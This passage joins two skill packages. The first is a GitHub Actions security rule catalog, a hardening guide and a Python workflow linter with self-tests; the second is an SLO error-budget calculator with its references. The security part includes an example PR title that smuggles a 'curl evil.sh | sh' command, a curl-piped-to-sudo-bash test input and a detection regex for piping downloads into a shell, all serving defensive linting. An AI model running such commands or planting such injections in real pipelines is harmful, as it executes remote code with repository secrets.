# Risk Catalog (rule IDs used by gha_audit.py)

| ID | Severity | What it detects | Why it matters | Fix |
|---|---|---|---|---|
| GHA001 | high | `pull_request_target` (or `workflow_run`) workflow that checks out the PR head (`ref: ${{ github.event.pull_request.head.sha }}`, `head.ref`, `github.head_ref`) | Code from a fork runs with repository secrets and a write token ("pwn request") | Use `pull_request` for building untrusted code; keep `pull_request_target` for labeling/commenting only, without checkout of PR code |
| GHA002 | high | Untrusted `${{ }}` expression inside `run:` or `github-script` `script:` (issue/PR title or body, comment body, head ref, commit message, author name/email, page name) | The text is pasted into the script before it runs, so a title like `"; curl evil.sh | sh #` executes | Pass it through `env:` and use `"$TITLE"` in the shell |
| GHA003 | medium (low for `actions/*`, `github/*`) | `uses: owner/repo@v4` pinned to a tag | Tags can be moved; a compromised action ships code into your build | Pin to the full 40-character commit SHA, keep the tag in a comment, let Dependabot update it |
| GHA004 | high | `uses:` with a branch (`@main`, `@master`) or no ref | Every run pulls whatever is on that branch today | Pin to a commit SHA |
| GHA005 | medium | No `permissions:` at workflow level and not on every job | The `GITHUB_TOKEN` gets the repository default, often read/write on everything | Add `permissions: contents: read` at the top and grant more per job |
| GHA006 | high | `permissions: write-all` | Every scope can be written by any step | List only the scopes needed |
| GHA007 | high / medium | `${{ secrets.X }}` inside a `run:` command (high when echoed or printed) | Secrets end up in shell history, process lists, logs, or injected text | Map the secret to `env:` and read `$X`; never echo it |
| GHA008 | medium | `curl ... \| bash` or `wget ... \| sh` | Runs unverified remote code with the job's token and secrets | Download, verify a checksum or signature, then run; or use a pinned action |
| GHA009 | medium | `self-hosted` runner in a workflow triggered by `pull_request` or `pull_request_target` | Fork code can persist on the machine and attack later jobs | Use GitHub-hosted or ephemeral runners for PRs; require approval for outside contributors |
| GHA010 | high | `ACTIONS_ALLOW_UNSECURE_COMMANDS: true` | Re-enables deprecated `set-env`/`add-path`, which log output can trigger | Remove it; write to `$GITHUB_ENV` and `$GITHUB_PATH` |
| GHA011 | low | `actions/checkout` without `persist-credentials: false` | The token stays in `.git/config` for every later step and any uploaded artifact | Add `persist-credentials: false` unless a later step pushes |
| GHA012 | low | Job without `timeout-minutes` | A hung or abused job can run for 6 hours on your minutes | Add a realistic timeout (e.g. 15-30) |
| GHA013 | low | `docker://image:tag` without `@sha256:` digest | Image tags are mutable | Pin `docker://image@sha256:<digest>` |
| GHA014 | medium | `workflow_run` workflow using `actions/download-artifact` | Artifacts from a fork-triggered run are attacker-controlled | Treat artifact contents as data: validate, never execute; avoid extracting into the workspace |

## Severity guide
- **high**: an outsider can likely run code with secrets or a write token, or a mutable reference controls the build.
- **medium**: hardening gap that makes a compromise easier or bigger.
- **low**: good practice; fix when touching the file.

# Hardening Guide

## 1. Pass untrusted text through env, not expressions
```yaml
# unsafe
- run: echo "Title: ${{ github.event.pull_request.title }}"
# safe
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```
Always double-quote the variable. In `actions/github-script`, read `context.payload.pull_request.title` in JavaScript instead of interpolating `${{ }}` into the script.

## 2. Least-privilege token
```yaml
permissions:
  contents: read          # workflow default
jobs:
  label:
    permissions:
      pull-requests: write  # only this job can label
```
Also set the repository default to read-only (Settings > Actions > General > Workflow permissions).

## 3. Pin actions to commit SHAs
```yaml
- uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
```
Enable Dependabot for the `github-actions` ecosystem so pins get update PRs with changelogs. Prefer actions from verified publishers and read the source of small third-party actions before adopting them.

## 4. Split privileged and unprivileged work
- `pull_request` workflow: builds and tests fork code with no secrets and a read-only token; uploads results as an artifact.
- `workflow_run` workflow: runs after it with secrets, downloads the artifact, treats it as untrusted data (parse JSON, never execute), and posts the comment or label.

## 5. Checkout and credentials
- `persist-credentials: false` on `actions/checkout` unless the job pushes.
- Never check out PR code in `pull_request_target`; if you must (e.g. a labeler reading config), check out the base branch only.

## 6. Runners and limits
- Self-hosted runners: private repositories only, or ephemeral (one job per VM) with no network access to internal systems.
- `timeout-minutes` on every job; `concurrency` groups for deploys.

## 7. Secrets and environments
- Put deploy credentials in an environment with required reviewers and branch rules.
- Prefer OIDC (`id-token: write`) to long-lived cloud keys.
- Mask derived values with `::add-mask::` before printing anything secret-like.

## Review checklist
1. Which triggers can outsiders fire?
2. What can the token write, and which secrets are reachable from those triggers?
3. Is any attacker-controlled text interpolated into a script?
4. Is every `uses:` pinned to a SHA?
5. Is any remote code executed without verification?

#!/usr/bin/env python3
"""GitHub Actions workflow security linter (Python 3 standard library only, no YAML library).

Reads workflow files line by line, tracking indentation, and reports risky patterns with rule IDs
(see references/risk-catalog.md):
  GHA001 pull_request_target/workflow_run + checkout of PR head      high
  GHA002 untrusted ${{ github.event.* }} text inside run:/script:    high
  GHA003 uses: pinned to a tag instead of a commit SHA               medium (low for actions/*, github/*)
  GHA004 uses: on a branch (@main/@master) or without a ref          high
  GHA005 no permissions at workflow level or on every job            medium
  GHA006 permissions: write-all                                      high
  GHA007 ${{ secrets.* }} inside run: (high when echoed/printed)     high/medium
  GHA008 curl/wget piped to a shell                                  medium
  GHA009 self-hosted runner on pull_request(_target)                 medium
  GHA010 ACTIONS_ALLOW_UNSECURE_COMMANDS enabled                     high
  GHA011 actions/checkout without persist-credentials: false         low
  GHA012 job without timeout-minutes                                 low
  GHA013 docker:// image without @sha256 digest                      low
  GHA014 workflow_run + actions/download-artifact                    medium

Usage:
  python3 gha_audit.py .github/workflows/*.yml
  python3 gha_audit.py ci.yml --json
  python3 gha_audit.py ci.yml --strict      # exit 1 on any finding
  python3 gha_audit.py --self-test
Exit code: 0 no high findings, 1 high findings (or any with --strict), 2 unreadable file.
"""
import argparse
import json
import re
import sys

SEV_ORDER = {"high": 0, "medium": 1, "low": 2}
TRUSTED_OWNERS = {"actions", "github"}
BRANCH_REFS = {"main", "master", "dev", "develop", "trunk", "head", "latest"}
UNTRUSTED_EXPR = re.compile(
    r"github\.head_ref"
    r"|github\.event\.[\w.*\[\]'\"-]*?\b(title|body|message|page_name|email|head_branch|default_branch|label)\b"
    r"|github\.event\.[\w.*\[\]'\"-]*?head\.ref\b"
    r"|github\.event\.[\w.*\[\]'\"-]*?author\.name\b"
)
EXPR = re.compile(r"\$\{\{(.*?)\}\}")
SECRET_EXPR = re.compile(r"\$\{\{\s*secrets\.([A-Za-z0-9_]+)\s*\}\}")
PR_HEAD_REF = re.compile(r"ref:\s*['\"]?\$\{\{\s*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(sha|branch))\s*\}\}")
PIPE_SHELL = re.compile(r"\b(curl|wget)\b[^|\n]*\|\s*(sudo\s+)?(-E\s+)?(ba|z|da)?sh\b")
PRINT_CMD = re.compile(r"\b(echo|printf|cat|tee|print)\b")
SHA40 = re.compile(r"^[0-9a-f]{40}$")


def strip_comment(line):
    """Remove a trailing YAML comment (a # preceded by whitespace, outside quotes)."""
    out, q = [], None
    for i, ch in enumerate(line):
        if q:
            if ch == q:
                q = None
        elif ch in "'\"":
            q = ch
        elif ch == "#" and (i == 0 or line[i - 1] in " \t"):
            break
        out.append(ch)
    return "".join(out).rstrip()


def indent_of(s):
    return len(s) - len(s.lstrip(" "))


def parse_lines(text):
    """Return a list of (lineno, indent, content) for non-empty, non-comment lines."""
    rows = []
    for n, raw in enumerate(text.splitlines(), 1):
        s = strip_comment(raw.replace("\t", "  "))
        if s.strip():
            rows.append((n, indent_of(s), s.strip()))
    return rows


def block_end(rows, i):
    """Index after the block owned by rows[i] (all following rows indented deeper)."""
    ind = rows[i][1]
    j = i + 1
    while j < len(rows) and rows[j][1] > ind:
        j += 1
    return j


def key_of(content):
    c = content[2:].lstrip() if content.startswith("- ") else content
    m = re.match(r"^['\"]?([A-Za-z0-9_\-]+)['\"]?\s*:(\s|$)", c)
    return (m.group(1), c[m.end():].strip()) if m else (None, None)


def triggers(rows):
    trig = set()
    for i, (n, ind, c) in enumerate(rows):
        k, v = key_of(c)
        if ind == 0 and k in ("on", "true"):
            if v:
                trig.update(re.findall(r"[a-z_]+", v))
            else:
                end = block_end(rows, i)
                child = min((rows[j][1] for j in range(i + 1, end)), default=None)
                for j in range(i + 1, end):
                    if rows[j][1] == child:
                        ck, _ = key_of(rows[j][2])
                        if ck:
                            trig.add(ck)
                        elif rows[j][2].startswith("- "):
                            trig.add(rows[j][2][2:].strip())
    return trig


def audit_text(text, path="workflow.yml"):
    rows = parse_lines(text)
    findings = []

    def add(rule, sev, line, msg):
        findings.append({"file": path, "line": line, "rule": rule, "severity": sev, "message": msg})

    trig = triggers(rows)
    privileged = trig & {"pull_request_target", "workflow_run"}
    pr_triggers = trig & {"pull_request", "pull_request_target"}

    top_perm = None
    jobs_idx = None
    for i, (n, ind, c) in enumerate(rows):
        k, v = key_of(c)
        if ind == 0 and k == "permissions":
            top_perm = (n, v)
        if ind == 0 and k == "jobs":
            jobs_idx = i
    if top_perm and top_perm[1].strip("'\"") == "write-all":
        add("GHA006", "high", top_perm[0], "permissions: write-all gives every step write access to all scopes")

    # jobs
    jobs = []
    if jobs_idx is not None:
        end = block_end(rows, jobs_idx)
        child = min((rows[j][1] for j in range(jobs_idx + 1, end)), default=None)
        for j in range(jobs_idx + 1, end):
            if rows[j][1] == child and key_of(rows[j][2])[0]:
                jobs.append((j, block_end(rows, j)))
    jobs_with_perm = 0
    for (js, je) in jobs:
        jname = key_of(rows[js][2])[0]
        jind = rows[js][1]
        direct = [r for r in rows[js + 1:je] if r[1] == min(x[1] for x in rows[js + 1:je])] if je > js + 1 else []
        dkeys = {key_of(r[2])[0]: r for r in direct}
        if "permissions" in dkeys:
            jobs_with_perm += 1
            if dkeys["permissions"][2].split(":", 1)[1].strip().strip("'\"") == "write-all":
                add("GHA006", "high", dkeys["permissions"][0], f"job '{jname}' uses permissions: write-all")
        if "timeout-minutes" not in dkeys and "uses" not in dkeys:
            add("GHA012", "low", rows[js][0], f"job '{jname}' has no timeout-minutes (default is 360)")
        if "runs-on" in dkeys:
            ro_i = rows.index(dkeys["runs-on"])
            ro_text = " ".join(r[2] for r in rows[ro_i:block_end(rows, ro_i)])
            if "self-hosted" in ro_text and pr_triggers:
                add("GHA009", "medium", dkeys["runs-on"][0], f"job '{jname}' runs pull request code on a self-hosted runner")
    if top_perm is None and (not jobs or jobs_with_perm < len(jobs)):
        add("GHA005", "medium", 1, "no permissions block at workflow level (and not on every job); GITHUB_TOKEN gets the repo default")

    # line-level checks
    i = 0
    while i < len(rows):
        n, ind, c = rows[i]
        k, v = key_of(c)
        if k in ("run", "script"):
            end = block_end(rows, i)
            body = [(n, v)] if v and v not in ("|", ">", "|-", ">-", "|+", ">+") else []
            body += [(r[0], r[2]) for r in rows[i + 1:end]]
            for bn, bt in body:
                for m in EXPR.finditer(bt):
                    expr = m.group(1).strip()
                    if UNTRUSTED_EXPR.search(expr):
                        add("GHA002", "high", bn, f"untrusted expression ${{{{ {expr} }}}} is pasted into {k}: (script injection); pass it via env")
                for m in SECRET_EXPR.finditer(bt):
                    if PRINT_CMD.search(bt):
                        add("GHA007", "high", bn, f"secret {m.group(1)} is printed in {k}:")
                    else:
                        add("GHA007", "medium", bn, f"secret {m.group(1)} is interpolated into {k}:; map it to env instead")
                if k == "run" and PIPE_SHELL.search(bt):
                    add("GHA008", "medium", bn, "remote script piped straight into a shell")
            i = end
            continue
        if k == "uses":
            ref = v.strip("'\"")
            if ref.startswith("./"):
                pass
            elif ref.startswith("docker://"):
                if "@sha256:" not in ref:
                    add("GHA013", "low", n, f"{ref} is not pinned to an image digest")
            else:
                name, _, at = ref.partition("@")
                owner = name.split("/")[0].lower()
                if not at or at.lower() in BRANCH_REFS:
                    add("GHA004", "high", n, f"{ref or name} follows a branch or has no ref; pin to a commit SHA")
                elif not SHA40.match(at):
                    sev = "low" if owner in TRUSTED_OWNERS else "medium"
                    add("GHA003", sev, n, f"{ref} is pinned to a tag, not a full commit SHA")
                if name.lower().startswith("actions/checkout"):
                    # the step block: siblings at this indent (after '- ') and deeper
                    step_ind = ind + 2 if c.startswith("- ") else ind
                    j = i + 1
                    j0 = i
                    while j0 > 0 and not rows[j0][2].startswith("- ") and rows[j0][1] >= step_ind:
                        j0 -= 1
                    while j < len(rows) and rows[j][1] >= step_ind and not (rows[j][1] == step_ind - 2 and rows[j][2].startswith("- ")):
                        j += 1
                    step = " ".join(r[2] for r in rows[j0:j])
                    if not re.search(r"persist-credentials:\s*['\"]?false", step):
                        add("GHA011", "low", n, "actions/checkout keeps the token in .git/config; add persist-credentials: false")
                if name.lower().startswith("actions/download-artifact") and "workflow_run" in trig:
                    add("GHA014", "medium", n, "artifact from a workflow_run may be attacker-controlled; treat as data")
        if privileged and PR_HEAD_REF.search(c):
            add("GHA001", "high", n, f"{'/'.join(sorted(privileged))} workflow checks out untrusted PR code with secrets available")
        if re.search(r"ACTIONS_ALLOW_UNSECURE_COMMANDS\s*:\s*['\"]?true", c, re.I):
            add("GHA010", "high", n, "ACTIONS_ALLOW_UNSECURE_COMMANDS re-enables set-env/add-path")
        i += 1

    findings.sort(key=lambda f: (f["file"], SEV_ORDER[f["severity"]], f["line"], f["rule"]))
    return {"file": path, "triggers": sorted(trig), "jobs": len(jobs), "findings": findings}


def to_markdown(results):
    out = ["# GitHub Actions security audit", ""]
    tot = {"high": 0, "medium": 0, "low": 0}
    for r in results:
        for f in r["findings"]:
            tot[f["severity"]] += 1
    out.append(f"**Files:** {len(results)}  **Findings:** {tot['high']} high, {tot['medium']} medium, {tot['low']} low")
    for r in results:
        out += ["", f"## {r['file']}", f"Triggers: {', '.join(r['triggers']) or 'none found'}; jobs: {r['jobs']}", ""]
        if not r["findings"]:
            out.append("No findings.")
            continue
        out += ["| Severity | Rule | Line | Finding |", "|---|---|---|---|"]
        for f in r["findings"]:
            msg = f["message"].replace("|", "\\|")
            out.append(f"| {f['severity']} | {f['rule']} | {f['line']} | {msg} |")
    return "\n".join(out)


SAFE = """name: CI
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0
        with:
          persist-credentials: false
      - name: Test
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Testing $PR_TITLE"
          make test
"""


def self_test():
    cases = []

    def ok(name, cond):
        cases.append((name, bool(cond)))

    def rules(text):
        return [(f["rule"], f["severity"]) for f in audit_text(text)["findings"]]

    ok("safe workflow has no findings", rules(SAFE) == [])
    ok("triggers parsed from block", audit_text(SAFE)["triggers"] == ["pull_request"])
    ok("triggers parsed from list", audit_text("on: [push, pull_request]\njobs: {}\n")["triggers"] == ["pull_request", "push"])
    inj = SAFE.replace('echo "Testing $PR_TITLE"', 'echo "${{ github.event.pull_request.title }}"')
    ok("title in run is GHA002 high", ("GHA002", "high") in rules(inj))
    ok("head_ref in run is GHA002", ("GHA002", "high") in rules(SAFE.replace("make test", "git push origin ${{ github.head_ref }}")))
    ok("comment body in github-script", ("GHA002", "high") in rules(SAFE.replace("run: |", "script: |")
                                                                      .replace("make test", "core.info('${{ github.event.comment.body }}')")))
    ok("env indirection is not flagged", not any(r == "GHA002" for r, _ in rules(SAFE)))
    ok("PR number is safe", rules(SAFE.replace("make test", "echo ${{ github.event.pull_request.number }}")) == [])
    ok("tag pin on actions/* is GHA003 low", ("GHA003", "low") in rules(SAFE.replace("@08eba0b27e820071cde6df949e0beb9ba4906955", "@v4")))
    ok("tag pin third party is medium", ("GHA003", "medium") in rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955", "acme/checkout@v1")))
    ok("branch pin is GHA004 high", ("GHA004", "high") in rules(SAFE.replace("@08eba0b27e820071cde6df949e0beb9ba4906955", "@main")))
    ok("local action not flagged", rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955", "./.github/actions/setup")) == [])
    ok("missing permissions is GHA005", ("GHA005", "medium") in rules(SAFE.replace("permissions:\n  contents: read\n", "")))
    ok("job-level permissions satisfy GHA005", rules(SAFE.replace("permissions:\n  contents: read\n", "").replace("    timeout-minutes: 15\n", "    timeout-minutes: 15\n    permissions:\n      contents: read\n")) == [])
    ok("write-all is GHA006", ("GHA006", "high") in rules(SAFE.replace("permissions:\n  contents: read", "permissions: write-all")))
    ok("echoed secret is GHA007 high", ("GHA007", "high") in rules(SAFE.replace("make test", "echo ${{ secrets.NPM_TOKEN }}")))
    ok("inline secret is GHA007 medium", ("GHA007", "medium") in rules(SAFE.replace("make test", "npm publish --token ${{ secrets.NPM_TOKEN }}")))
    ok("curl | bash is GHA008", ("GHA008", "medium") in rules(SAFE.replace("make test", "curl -fsSL https://x.sh | sudo bash")))
    ok("self-hosted on PR is GHA009", ("GHA009", "medium") in rules(SAFE.replace("ubuntu-latest", "[self-hosted, linux]")))
    ok("self-hosted on push is fine", rules(SAFE.replace("pull_request:", "push:").replace("ubuntu-latest", "self-hosted")) == [])
    ok("unsecure commands is GHA010", ("GHA010", "high") in rules(SAFE.replace("PR_TITLE: ${{ github.event.pull_request.title }}", "ACTIONS_ALLOW_UNSECURE_COMMANDS: true")))
    ok("checkout without persist-credentials is GHA011", ("GHA011", "low") in rules(SAFE.replace("        with:\n          persist-credentials: false\n", "")))
    ok("missing timeout is GHA012", ("GHA012", "low") in rules(SAFE.replace("    timeout-minutes: 15\n", "")))
    ok("docker tag is GHA013", ("GHA013", "low") in rules(SAFE.replace("actions/checkout@08eba0b27e820071cde6df949e0beb9ba4906955 # v4.3.0", "docker://alpine:3.20")))
    prt = SAFE.replace("pull_request:", "pull_request_target:").replace("persist-credentials: false", "persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}")
    ok("pull_request_target + head checkout is GHA001", ("GHA001", "high") in rules(prt))
    ok("pull_request + head checkout is not GHA001", not any(r == "GHA001" for r, _ in rules(SAFE.replace("persist-credentials: false", "persist-credentials: false\n          ref: ${{ github.event.pull_request.head.sha }}"))))
    wr = SAFE.replace("pull_request:", "workflow_run:\n    workflows: [CI]").replace("      - name: Test", "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5\n      - name: Test")
    ok("workflow_run + download-artifact is GHA014", ("GHA014", "medium") in rules(wr))
    ok("comment with # in string kept", strip_comment('run: echo "a # b" # note') == 'run: echo "a # b"')
    md = to_markdown([audit_text(inj, "ci.yml")])
    ok("markdown lists file and rule", "## ci.yml" in md and "GHA002" in md)
    passed = sum(c for _, c in cases)
    for name, c in cases:
        print(("PASS " if c else "FAIL ") + name)
    print(f"{passed}/{len(cases)} passed")
    return 0 if passed == len(cases) else 1


def main(argv=None):
    ap = argparse.ArgumentParser(description="Lint GitHub Actions workflow files for security risks.")
    ap.add_argument("files", nargs="*", help="workflow .yml files ('-' for stdin)")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--strict", action="store_true", help="exit 1 on any finding")
    ap.add_argument("--self-test", action="store_true")
    a = ap.parse_args(argv)
    if a.self_test:
        return self_test()
    if not a.files:
        ap.error("at least one workflow file required (or --self-test)")
    results = []
    for p in a.files:
        try:
            text = sys.stdin.read() if p == "-" else open(p, encoding="utf-8").read()
        except OSError as e:
            print(f"error: {e}", file=sys.stderr)
            return 2
        results.append(audit_text(text, p))
    print(json.dumps(results, indent=2) if a.json else to_markdown(results))
    allf = [f for r in results for f in r["findings"]]
    if any(f["severity"] == "high" for f in allf) or (a.strict and allf):
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())

# SLO Error Budget and Burn Rate Calculator

You help engineers and on-call teams reason about reliability with numbers instead of gut feeling. You turn good/total request counts into an SLI, translate the SLO into an error budget, show how fast the budget is burning in several windows, say which alerts would page or open a ticket, and estimate when the budget runs out at the current pace. You explain every number in plain language so product owners can follow the decision.

## Files in this skill

- `scripts/slo_budget.py` - reads a CSV of request counts per interval and prints SLI, budget consumed and remaining, burn rates, alert states, exhaustion times and the worst interval; `--allowance` prints allowed downtime and alert thresholds for any SLO (Python 3 standard library only)
- `references/slo-math.md` - formulas for SLI, error budget, burn rate, projected consumption, and worked numbers for common targets
- `references/burn-rate-alerting.md` - the multiwindow, multi-burn-rate alert policy, how thresholds scale with the window, and tuning advice
- `templates/slo-status-report.md` - a weekly SLO status or incident budget summary
- `examples/checkout-api-requests.csv` - two days of 15-minute request counts for a checkout API with a small blip and a 2-hour incident at the end

## Workflow

### 1. Define the SLI and SLO
Ask what a "good" event is (status < 500, latency under 300 ms, successful job run), where the counts come from, the target (99%, 99.5%, 99.9%, 99.95%), and the window (rolling 28 or 30 days). Push back on targets the system has never met: show the historical SLI first.

### 2. Get the data
Export good and total (or bad and total) counts per interval, for example 1-minute, 5-minute or 15-minute buckets, as CSV with `timestamp,total,good`. The timestamp marks the start of each interval. Use UTC.

### 3. Run the calculator
```
python3 scripts/slo_budget.py examples/checkout-api-requests.csv --slo 99.9 --window 30d
python3 scripts/slo_budget.py requests.csv --slo 99.5 --window 28d --json > slo.json
python3 scripts/slo_budget.py requests.csv --now 2026-10-19T22:00:00Z
python3 scripts/slo_budget.py --allowance --slo 99.95 --window 30d
python3 scripts/slo_budget.py --self-test
```
Exit code 1 means a page alert is firing or the budget is exhausted; 2 means bad input (missing columns, bad > total, unparseable timestamps).

### 4. Interpret
- Burn rate 1.0 spends exactly the budget over the window; 14.4 for an hour spends 2% of a 30-day budget.
- Budget consumed is projected against the traffic seen so far; with less than a full window of data, say so.
- An alert fires only when both its long and short window exceed the threshold; the short window makes it stop quickly after recovery. See `references/burn-rate-alerting.md`.
- Windows shorter than the data step are rounded up to one step; windows longer than the data are "not evaluable".

### 5. Recommend and report
Tie the numbers to a decision: page now, open a ticket, slow down risky releases while remaining budget is low, or loosen an SLO that is always violated by design. Fill `templates/slo-status-report.md`.

## Example result
For `examples/checkout-api-requests.csv` at 99.9% over 30d: SLI 99.8768%, 8.2% of the budget consumed, 1h burn 26.46 and 5m burn 28.06 so the fast page fires, 6h burn 5.83 just under 6.0, the 3d ticket is not evaluable with two days of data, and at the last hour's pace the budget is gone in about 1d 16h. Exit code 1.

## Rules

- State the SLO, window, data range and any missing intervals with every result.
- Do not mix good-event definitions in one SLI; compute separate SLOs for availability and latency.
- An SLO is a decision tool, not a blame tool: describe impact on users, not on people.
- Do not invent traffic numbers; if counts are missing, ask for them or say which result cannot be computed.
FILE:references/slo-math.md
# SLO Math

## Definitions
- **SLI** (service level indicator) = good events / total events, as a percentage.
- **SLO** (objective) = target SLI over a window, e.g. 99.9% of requests succeed over a rolling 30 days.
- **Error budget** = 1 - SLO = the share of events allowed to fail. 99.9% -> 0.1%.
- **Budget in events** = (1 - SLO) x total events in the window.
- **Error rate** over a window = bad / total in that window.
- **Burn rate** = error rate / (1 - SLO). 1.0 means the budget would be exactly used up at the end of the window.

## Projected consumption with partial data
With D seconds of data and W seconds of SLO window:
- expected requests in window = (requests in data / D) x W
- allowed bad = (1 - SLO) x expected requests
- consumed = bad in data / allowed bad
- time to exhaustion at a recent rate = (allowed bad - bad so far) / (bad per second in that recent window)

## Allowed full downtime
| SLO | per 30 days | per 28 days | per week | per day |
|---|---|---|---|---|
| 99% | 7h 12m | 6h 43m 12s | 1h 40m 48s | 14m 24s |
| 99.5% | 3h 36m | 3h 21m 36s | 50m 24s | 7m 12s |
| 99.9% | 43m 12s | 40m 19s | 10m 5s | 1m 26s |
| 99.95% | 21m 36s | 20m 10s | 5m 2s | 43s |
| 99.99% | 4m 19s | 4m 2s | 1m 0s | 9s |

Request-based SLOs do not care about clock time directly: 10 minutes of 50% errors costs the same as 5 minutes of full downtime at equal traffic, and an outage at 3 a.m. costs less budget than one at peak.

## Worked example
SLO 99.9%, 30d window, 1,000,000 requests per day.
- Budget: 0.001 x 30,000,000 = 30,000 failed requests.
- A 2% error rate for one hour at 41,667 req/h burns 833 failures = 2.8% of the budget, burn rate 20.
- At burn rate 20 the whole budget lasts 30d / 20 = 36 hours.

## Pitfalls
- Counting retries as separate good events hides user-facing failures.
- Very low traffic (night, new region) makes error rates noisy; use a minimum request count or a longer short window.
- Synthetic probes measure the probe, not users; label them separately.
- Changing the SLO mid-window: recompute the whole window with the new target and say so.
FILE:references/burn-rate-alerting.md
# Burn-Rate Alerting

## Default policy (multiwindow, multi-burn-rate)
| Severity | Budget share | Long window | Short window | Burn threshold (30d) | Burn threshold (28d) |
|---|---|---|---|---|---|
| page | 2% | 1h | 5m | 14.4 | 13.44 |
| page | 5% | 6h | 30m | 6.0 | 5.6 |
| ticket | 10% | 1d | 2h | 3.0 | 2.8 |
| ticket | 10% | 3d | 6h | 1.0 | 0.93 |

Threshold = budget share x SLO window / long window. Example: 0.02 x 720h / 1h = 14.4.

## Why two windows
- The **long window** proves the problem is significant (enough budget spent).
- The **short window** (about 1/12 of the long one) proves it is still happening, so the alert resets within minutes after recovery instead of staying red for an hour.
- Fire only when both exceed the threshold.

## Example alert rule (Prometheus style)
```
(
  sum(rate(http_requests_errors_total[1h])) / sum(rate(http_requests_total[1h])) > (14.4 * 0.001)
and
  sum(rate(http_requests_errors_total[5m])) / sum(rate(http_requests_total[5m])) > (14.4 * 0.001)
)
```

## Tuning
- Low-traffic services: require a minimum number of requests in the short window, or page on 6h only.
- Too many pages: check whether the SLO is stricter than users need before raising thresholds.
- Missed incidents: slow burns below 1.0 never alert by design; review the budget weekly.
- Data step coarser than the short window (e.g. 15-minute buckets): the short window becomes one bucket and recovery detection is slower.

## Budget policy ideas
- Over 50% consumed: review risky changes, prefer canaries.
- Over 75%: release freeze for non-fixes, reliability work first.
- Exhausted: postmortem required; freeze until the rolling window recovers.

#!/usr/bin/env python3
"""SLO error budget and burn rate calculator (Python 3 standard library only).

Input: CSV with one row per interval, the timestamp marking the START of the interval, and request
counts. Accepted columns (case-insensitive): timestamp|time|ts, total|requests|count, and either
good|success|ok or bad|errors|failed. Timestamps: ISO 8601 (Z or offset) or Unix seconds.

Math (see references/slo-math.md):
  error budget (fraction)  = 1 - SLO                          e.g. 99.9% -> 0.001
  error rate over window   = sum(bad) / sum(total)
  burn rate                = error rate / (1 - SLO)           1.0 = spends exactly the budget over the SLO window
  budget consumed so far   = sum(bad) / ((1 - SLO) * expected requests in the SLO window)
  alert threshold          = budget share * window hours / long window hours   (14.4 = 2% of 30d in 1h)

Default multiwindow, multi-burn-rate policy (Google SRE Workbook): page 2% in 1h (short 5m),
page 5% in 6h (short 30m), ticket 10% in 1d (short 2h), ticket 10% in 3d (short 6h). An alert fires
only when BOTH the long and the short window burn faster than the threshold. Windows shorter than
the data step are rounded up to one step; windows longer than the data are reported as not evaluable.

Usage:
  python3 slo_budget.py requests.csv --slo 99.9 --window 30d
  python3 slo_budget.py requests.csv --slo 99.5 --window 28d --json
  python3 slo_budget.py --allowance --slo 99.95 --window 30d     # downtime allowed, no CSV needed
  python3 slo_budget.py --self-test
Exit code: 0 OK, 1 a page alert fires or the budget is exhausted, 2 bad input.
"""
import argparse
import csv
import datetime as dt
import json
import re
import statistics
import sys

POLICY = [
    # (severity, long window, short window, budget share)
    ("page", "1h", "5m", 0.02),
    ("page", "6h", "30m", 0.05),
    ("ticket", "1d", "2h", 0.10),
    ("ticket", "3d", "6h", 0.10),
]
ALIASES = {
    "ts": ("timestamp", "time", "ts", "date", "datetime"),
    "total": ("total", "requests", "count", "events"),
    "good": ("good", "success", "ok", "successes"),
    "bad": ("bad", "errors", "failed", "failures", "error"),
}


class SLOError(ValueError):
    pass


def parse_duration(s):
    m = re.fullmatch(r"\s*(\d+(?:\.\d+)?)\s*([smhdw])\s*", str(s).lower())
    if not m:
        raise SLOError(f"bad duration {s!r} (use e.g. 5m, 1h, 28d)")
    return float(m.group(1)) * {"s": 1, "m": 60, "h": 3600, "d": 86400, "w": 604800}[m.group(2)]


def fmt_dur(sec):
    sec = int(round(sec))
    if sec >= 86400:
        d, h = divmod(sec // 3600, 24)
        return f"{d}d {h}h" if h else f"{d}d"
    if sec >= 3600:
        h, m = divmod(sec // 60, 60)
        return f"{h}h {m}m" if m else f"{h}h"
    if sec >= 60:
        m, s = divmod(sec, 60)
        return f"{m}m {s}s" if s else f"{m}m"
    return f"{sec}s"


def parse_ts(v):
    v = v.strip()
    if re.fullmatch(r"\d+(\.\d+)?", v):
        return dt.datetime.fromtimestamp(float(v), dt.timezone.utc)
    t = dt.datetime.fromisoformat(v.replace("Z", "+00:00").replace(" ", "T"))
    if t.tzinfo is None:
        t = t.replace(tzinfo=dt.timezone.utc)
    return t.astimezone(dt.timezone.utc)


def load_rows(lines):
    rd = csv.DictReader(lines)
    if not rd.fieldnames:
        raise SLOError("empty CSV")
    cols = {}
    lower = {f.strip().lower(): f for f in rd.fieldnames}
    for key, names in ALIASES.items():
        for n in names:
            if n in lower:
                cols[key] = lower[n]
                break
    if "ts" not in cols or "total" not in cols or not ({"good", "bad"} & cols.keys()):
        raise SLOError(f"need timestamp, total and good or bad columns; got {rd.fieldnames}")
    rows = []
    for i, r in enumerate(rd, 2):
        try:
            ts = parse_ts(r[cols["ts"]])
            total = int(float(r[cols["total"]]))
            bad = int(float(r[cols["bad"]])) if "bad" in cols else total - int(float(r[cols["good"]]))
        except (ValueError, TypeError) as e:
            raise SLOError(f"line {i}: {e}")
        if total < 0 or bad < 0 or bad > total:
            raise SLOError(f"line {i}: counts must satisfy 0 <= bad <= total (total={total}, bad={bad})")
        rows.append((ts, total, bad))
    if len(rows) < 2:
        raise SLOError("need at least two rows")
    rows.sort(key=lambda r: r[0])
    return rows


def analyze(rows, slo_pct, window, now=None, policy=POLICY):
    if not 0 < slo_pct < 100:
